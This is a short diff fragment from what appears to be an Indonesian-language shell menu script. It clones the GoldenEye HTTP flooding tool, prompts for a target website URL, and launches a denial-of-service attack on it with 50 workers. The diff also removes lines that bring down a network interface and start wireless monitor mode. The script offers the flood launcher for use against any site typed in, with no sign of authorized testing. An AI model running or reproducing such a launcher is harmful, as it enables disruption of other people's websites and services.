@@ -177,8 +177,6 @@ sleep 5
 git clone https://github.com/jseidl/GoldenEye
 cd GoldenEye
 chmod +x goldeneye.py
-ifconfig eth0 down
-airmon-ng start wlan0
 echo "╭─[Masukan URL Website]" | lolcat
 read -p"╰─>> " url
 ./goldeneye.py $url -w 50 -d
